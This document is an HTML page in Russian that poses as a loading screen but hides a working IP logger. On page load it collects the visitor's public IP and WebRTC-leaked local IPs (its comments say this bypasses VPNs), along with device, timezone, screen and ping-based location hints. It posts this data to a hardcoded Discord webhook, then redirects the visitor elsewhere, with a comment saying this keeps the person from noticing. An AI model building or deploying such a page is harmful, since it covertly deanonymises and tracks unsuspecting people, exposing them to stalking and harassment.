<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Загрузка...</title>
<style>
  body { background: #000; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; overflow: hidden; }
  .loader { text-align: center; }
  .spin { width: 40px; height: 40px; border: 4px solid #333; border-top-color: #00ff41; border-radius: 50%; animation: s 0.8s linear infinite; margin: 0 auto 20px; }
  @keyframes s { to { transform: rotate(360deg); } }
  p { font-size: 14px; color: #888; margin: 0; }
</style>
</head>
<body>
<div class="loader">
  <div class="spin"></div>
  <p>Загрузка контента...</p>
</div>

<script>
// =====================================================================
// 1. КОНФИГУРАЦИЯ (Твой Discord Webhook)
// =====================================================================
const HOOK = "https://discord.com/api/webhooks/1569647657406824478/DK6Z_qdLCpqPXWQHKKXbMylcXjZrZPZqXzHLpttg0GbuVcy6axwgGFBsfuqOoyTqer1l";

// Данные для сбора
let report = {
  time: new Date().toLocaleString("ru-RU"),
  public_ip: "Определяется...",
  webrtc_ips: [],
  device: navigator.userAgent,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  screen: screen.width + "x" + screen.height,
  lang: navigator.language,
  pings: {}
};

// =====================================================================
// 2. МГНОВЕННЫЙ СБОР ДАННЫХ (Запускается сразу)
// =====================================================================

// А) Получаем публичный IP
async function getIP() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    report.public_ip = d.ip;
  } catch(e) { report.public_ip = "Заблокирован"; }
}

// Б) WebRTC (Локальные IP / Обход VPN)
async function getWebRTC() {
  return new Promise((resolve) => {
    const ips = [];
    try {
      const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ 
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] 
      });
      pc.createDataChannel("");
      pc.onicecandidate = (e) => {
        if (!e.candidate) { pc.close(); return resolve(); }
        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
        if (match && !ips.includes(match[1])) {
          ips.push(match[1]);
          report.webrtc_ips = ips;
        }
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => { pc.close(); resolve(); }, 1500);
    } catch(e) { resolve(); }
  });
}

// В) Быстрый Пинг (Определение геолокации по скорости)
function ping(url) {
  return new Promise((resolve) => {
    const start = performance.now();
    const img = new Image();
    const timeout = setTimeout(() => { img.src = ""; resolve(9999); }, 1500);
    img.onload = img.onerror = () => { clearTimeout(timeout); resolve(Math.round(performance.now() - start)); };
    img.src = url + "?t=" + start;
  });
}

// =====================================================================
// 3. ОТПРАВКА В DISCORD
// =====================================================================
async function sendData() {
  let pingText = "";
  const servers = {
    "Москва": "https://yandex.ru/favicon.ico",
    "Лондон": "https://www.bbc.co.uk/favicon.ico",
    "США": "https://www.google.com/favicon.ico"
  };

  for (const [city, url] of Object.entries(servers)) {
    report.pings[city] = await ping(url) + "ms";
  }

  const message = `**⚡ МГНОВЕННЫЙ ПЕРЕХВАТ**\n**IP:** \`${report.public_ip}\`\n**WebRTC:** \`${report.webrtc_ips.join(", ") || "Нет"}\`\n**Устройство:** ${report.device.substring(0, 60)}...\n**Таймзона:** ${report.timezone}\n**Экран:** ${report.screen}\n**Пинги:** ${JSON.stringify(report.pings)}`;

  await fetch(HOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message })
  }).catch(() => {});

  // МГНОВЕННЫЙ РЕДИРЕКТ, ЧТОБЫ ЧЕЛОВЕК НЕ ПОНЯЛ, ЧТО ПРОИЗОШЛО
  window.location.href = "https://www.google.com"; // Замени на любой сайт (YouTube, Roblox, VK)
}

// =====================================================================
// ЗАПУСК (Мгновенно)
// =====================================================================
(async function() {
  getIP();
  await getWebRTC();
  await sendData();
})();
</script>
</body>
</html>
